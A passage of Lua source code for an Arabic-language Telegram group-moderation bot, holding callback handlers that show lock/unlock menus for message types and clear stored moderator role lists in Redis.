{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الدردشه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_video') then
local UserId = Text:match('(%d+)/Status_video')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الفيديو', data =UserId..'/'.. 'lock_video'},{text = 'قفل الفيديو بالكتم', data =UserId..'/'.. 'lock_videoktm'},
},
{
{text = 'قفل الفيديو بالطرد', data =UserId..'/'.. 'lock_videokick'},{text = 'قفل الفيديو بالتقييد', data =UserId..'/'.. 'lock_videokid'},
},
{
{text = 'فتح الفيديو', data =UserId..'/'.. 'unlock_video'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الفيديو", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_photo') then
local UserId = Text:match('(%d+)/Status_photo')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الصور', data =UserId..'/'.. 'lock_photo'},{text = 'قفل الصور بالكتم', data =UserId..'/'.. 'lock_photoktm'},
},
{
{text = 'قفل الصور بالطرد', data =UserId..'/'.. 'lock_photokick'},{text = 'قفل الصور بالتقييد', data =UserId..'/'.. 'lock_photokid'},
},
{
{text = 'فتح الصور', data =UserId..'/'.. 'unlock_photo'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الصور", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_username') then
local UserId = Text:match('(%d+)/Status_username')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل المعرفات', data =UserId..'/'.. 'lock_username'},{text = 'قفل المعرفات بالكتم', data =UserId..'/'.. 'lock_usernamektm'},
},
{
{text = 'قفل المعرفات بالطرد', data =UserId..'/'.. 'lock_usernamekick'},{text = 'قفل المعرفات بالتقييد', data =UserId..'/'.. 'lock_usernamekid'},
},
{
{text = 'فتح المعرفات', data =UserId..'/'.. 'unlock_username'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر المعرفات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_tags') then
local UserId = Text:match('(%d+)/Status_tags')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التاك', data =UserId..'/'.. 'lock_tags'},{text = 'قفل التاك بالكتم', data =UserId..'/'.. 'lock_tagsktm'},
},
{
{text = 'قفل التاك بالطرد', data =UserId..'/'.. 'lock_tagskick'},{text = 'قفل التاك بالتقييد', data =UserId..'/'.. 'lock_tagskid'},
},
{
{text = 'فتح التاك', data =UserId..'/'.. 'unlock_tags'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر التاك", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_bots') then
local UserId = Text:match('(%d+)/Status_bots')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل البوتات', data =UserId..'/'.. 'lock_bots'},{text = 'قفل البوتات بالطرد', data =UserId..'/'.. 'lock_botskick'},
},
{
{text = 'فتح البوتات', data =UserId..'/'.. 'unlock_bots'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر البوتات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_fwd') then
local UserId = Text:match('(%d+)/Status_fwd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التوجيه', data =UserId..'/'.. 'lock_fwd'},{text = 'قفل التوجيه بالكتم', data =UserId..'/'.. 'lock_fwdktm'},
},
{
{text = 'قفل التوجيه بالطرد', data =UserId..'/'.. 'lock_fwdkick'},{text = 'قفل التوجيه بالتقييد', data =UserId..'/'.. 'lock_fwdkid'},
},
{
{text = 'فتح التوجيه', data =UserId..'/'.. 'unlock_link'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر التوجيه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_audio') then
local UserId = Text:match('(%d+)/Status_audio')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الصوت', data =UserId..'/'.. 'lock_audio'},{text = 'قفل الصوت بالكتم', data =UserId..'/'.. 'lock_audioktm'},
},
{
{text = 'قفل الصوت بالطرد', data =UserId..'/'.. 'lock_audiokick'},{text = 'قفل الصوت بالتقييد', data =UserId..'/'.. 'lock_audiokid'},
},
{
{text = 'فتح الصوت', data =UserId..'/'.. 'unlock_audio'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الصوت", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_stikear') then
local UserId = Text:match('(%d+)/Status_stikear')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الملصقات', data =UserId..'/'.. 'lock_stikear'},{text = 'قفل الملصقات بالكتم', data =UserId..'/'.. 'lock_stikearktm'},
},
{
{text = 'قفل الملصقات بالطرد', data =UserId..'/'.. 'lock_stikearkick'},{text = 'قفل الملصقات بالتقييد', data =UserId..'/'.. 'lock_stikearkid'},
},
{
{text = 'فتح الملصقات', data =UserId..'/'.. 'unlock_stikear'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الملصقات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_phone') then
local UserId = Text:match('(%d+)/Status_phone')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الجهات', data =UserId..'/'.. 'lock_phone'},{text = 'قفل الجهات بالكتم', data =UserId..'/'.. 'lock_phonektm'},
},
{
{text = 'قفل الجهات بالطرد', data =UserId..'/'.. 'lock_phonekick'},{text = 'قفل الجهات بالتقييد', data =UserId..'/'.. 'lock_phonekid'},
},
{
{text = 'فتح الجهات', data =UserId..'/'.. 'unlock_phone'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الجهات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_joine') then
local UserId = Text:match('(%d+)/Status_joine')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الدفرخ', data =UserId..'/'.. 'lock_joine'},
},
{
{text = 'فتح الدفرخ', data =UserId..'/'.. 'unlock_joine'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الدفرخ", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_addmem') then
local UserId = Text:match('(%d+)/Status_addmem')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاضافه', data =UserId..'/'.. 'lock_addmem'},
},
{
{text = 'فتح الاضافه', data =UserId..'/'.. 'unlock_addmem'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الاضافه", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_videonote') then
local UserId = Text:match('(%d+)/Status_videonote')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل السيلفي', data =UserId..'/'.. 'lock_videonote'},{text = 'قفل السيلفي بالكتم', data =UserId..'/'.. 'lock_videonotektm'},
},
{
{text = 'قفل السيلفي بالطرد', data =UserId..'/'.. 'lock_videonotekick'},{text = 'قفل السيلفي بالتقييد', data =UserId..'/'.. 'lock_videonotekid'},
},
{
{text = 'فتح السيلفي', data =UserId..'/'.. 'unlock_videonote'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر بصمه الفيديو", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_pin') then
local UserId = Text:match('(%d+)/Status_pin')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التثبيت', data =UserId..'/'.. 'lock_pin'},
},
{
{text = 'فتح التثبيت', data =UserId..'/'.. 'unlock_pin'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر التثبيت", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_tgservir') then
local UserId = Text:match('(%d+)/Status_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الاشعارات', data =UserId..'/'.. 'lock_tgservir'},
},
{
{text = 'فتح الاشعارات', data =UserId..'/'.. 'unlock_tgservir'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الاشعارات", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_markdaun') then
local UserId = Text:match('(%d+)/Status_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الماركداون', data =UserId..'/'.. 'lock_markdaun'},{text = 'قفل الماركداون بالكتم', data =UserId..'/'.. 'lock_markdaunktm'},
},
{
{text = 'قفل الماركداون بالطرد', data =UserId..'/'.. 'lock_markdaunkick'},{text = 'قفل الماركداون بالتقييد', data =UserId..'/'.. 'lock_markdaunkid'},
},
{
{text = 'فتح الماركداون', data =UserId..'/'.. 'unlock_markdaun'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الماركدون", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_edits') then
local UserId = Text:match('(%d+)/Status_edits')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التعديل', data =UserId..'/'.. 'lock_edits'},
},
{
{text = 'فتح التعديل', data =UserId..'/'.. 'unlock_edits'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر التعديل", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_games') then
local UserId = Text:match('(%d+)/Status_games')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل الالعاب', data =UserId..'/'.. 'lock_games'},{text = 'قفل الالعاب بالكتم', data =UserId..'/'.. 'lock_gamesktm'},
},
{
{text = 'قفل الالعاب بالطرد', data =UserId..'/'.. 'lock_gameskick'},{text = 'قفل الالعاب بالتقييد', data =UserId..'/'.. 'lock_gameskid'},
},
{
{text = 'فتح الالعاب', data =UserId..'/'.. 'unlock_games'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر الالعاب", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/Status_flood') then
local UserId = Text:match('(%d+)/Status_flood')
if tonumber(IdUser) == tonumber(UserId) then

local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{
{text = 'قفل التكرار', data =UserId..'/'.. 'lock_flood'},{text = 'قفل التكرار بالكتم', data =UserId..'/'.. 'lock_floodktm'},
},
{
{text = 'قفل التكرار بالطرد', data =UserId..'/'.. 'lock_floodkick'},{text = 'قفل التكرار بالتقييد', data =UserId..'/'.. 'lock_floodkid'},
},
{
{text = 'فتح التكرار', data =UserId..'/'.. 'unlock_flood'},
},
{
{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},
},
}
}
LuaTele.editMessageText(ChatId,Msg_id,"• عليك اختيار نوع القفل او الفتح على امر التكرار", 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_link') then
local UserId = Text:match('(%d+)/unlock_link')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Link"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الروابط").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_spam') then
local UserId = Text:match('(%d+)/unlock_spam')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Spam"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الكلايش").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_keypord') then
local UserId = Text:match('(%d+)/unlock_keypord')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Keyboard"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الكيبورد").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_voice') then
local UserId = Text:match('(%d+)/unlock_voice')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:vico"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الاغاني").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_gif') then
local UserId = Text:match('(%d+)/unlock_gif')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Animation"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح المتحركات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_files') then
local UserId = Text:match('(%d+)/unlock_files')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Document"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الملفات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_text') then
local UserId = Text:match('(%d+)/unlock_text')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:text"..ChatId,true) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الدردشه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_video') then
local UserId = Text:match('(%d+)/unlock_video')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Video"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الفيديو").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_photo') then
local UserId = Text:match('(%d+)/unlock_photo')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Photo"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الصور").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_username') then
local UserId = Text:match('(%d+)/unlock_username')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:User:Name"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح المعرفات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_tags') then
local UserId = Text:match('(%d+)/unlock_tags')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:hashtak"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح التاك").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_bots') then
local UserId = Text:match('(%d+)/unlock_bots')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Bot:kick"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح البوتات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_fwd') then
local UserId = Text:match('(%d+)/unlock_fwd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:forward"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح التوجيه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_audio') then
local UserId = Text:match('(%d+)/unlock_audio')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Audio"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الصوت").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_stikear') then
local UserId = Text:match('(%d+)/unlock_stikear')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Sticker"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الملصقات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_phone') then
local UserId = Text:match('(%d+)/unlock_phone')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Contact"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الجهات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_joine') then
local UserId = Text:match('(%d+)/unlock_joine')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Join"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الدفرخ").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_addmem') then
local UserId = Text:match('(%d+)/unlock_addmem')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:AddMempar"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الاضافه").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_videonote') then
local UserId = Text:match('(%d+)/unlock_videonote')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Unsupported"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح بصمه الفيديو").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_pin') then
local UserId = Text:match('(%d+)/unlock_pin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."lockpin"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح التثبيت").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_tgservir') then
local UserId = Text:match('(%d+)/unlock_tgservir')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:tagservr"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الاشعارات").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_markdaun') then
local UserId = Text:match('(%d+)/unlock_markdaun')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:Markdaun"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الماركدون").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_edits') then
local UserId = Text:match('(%d+)/unlock_edits')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:edit"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح التعديل").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_games') then
local UserId = Text:match('(%d+)/unlock_games')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Lock:geam"..ChatId)  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح الالعاب").unLock, 'md', true, false, reply_markup)
end
elseif Text and Text:match('(%d+)/unlock_flood') then
local UserId = Text:match('(%d+)/unlock_flood')
if tonumber(IdUser) == tonumber(UserId) then
Redis:hdel(LaRiCa.."Spam:Group:User"..ChatId ,"Spam:User")  
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,Reply_Status(IdUser,"• تم فتح التكرار").unLock, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/Dev') then
local UserId = Text:match('(%d+)/Dev')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Dev:Groups") 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح مطورين البوت", 'md', false)
end
elseif Text and Text:match('(%d+)/Devss') then
local UserId = Text:match('(%d+)/Devss')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Devss:Groups") 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح مطورين الثانوين من البوت", 'md', false)
end
elseif Text and Text:match('(%d+)/Supcreator') then
local UserId = Text:match('(%d+)/Supcreator')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Supcreator:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المنشئين الاساسيين", 'md', false)
end
elseif Text and Text:match('(%d+)/Owners') then
local UserId = Text:match('(%d+)/Owners')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Owners:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المالكين", 'md', false)
end
elseif Text and Text:match('(%d+)/Creator') then
local UserId = Text:match('(%d+)/Creator')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Creator:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح منشئين الكروب", 'md', false)
end
elseif Text and Text:match('(%d+)/Manger') then
local UserId = Text:match('(%d+)/Manger')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Manger:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المدراء", 'md', false)
end
elseif Text and Text:match('(%d+)/Admin') then
local UserId = Text:match('(%d+)/Admin')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Admin:Group"..ChatId) 
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح ادمنيه الكروب", 'md', false)
end
elseif Text and Text:match('(%d+)/DelSpecial') then
local UserId = Text:match('(%d+)/DelSpecial')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."Special:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح المميزين", 'md', false)
end
elseif Text and Text:match('(%d+)/Delkholat') then
local UserId = Text:match('(%d+)/Delkholat')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."kholat:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع فرخات المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delwtk') then
local UserId = Text:match('(%d+)/Delwtk')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."wtka:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع وتكات المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Deltwhd') then
local UserId = Text:match('(%d+)/Deltwhd')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."twhd:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
LuaTele.editMessageText(ChatId,Msg_id,"• تم مسح جميع متوحدين المجموعة", 'md', false)
end
elseif Text and Text:match('(%d+)/Delklb') then
local UserId = Text:match('(%d+)/Delklb')
if tonumber(IdUser) == tonumber(UserId) then
Redis:del(LaRiCa.."klb:Group"..ChatId) 
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '- رجوع', data =UserId..'/'.. 'NoNextSeting'},},}}
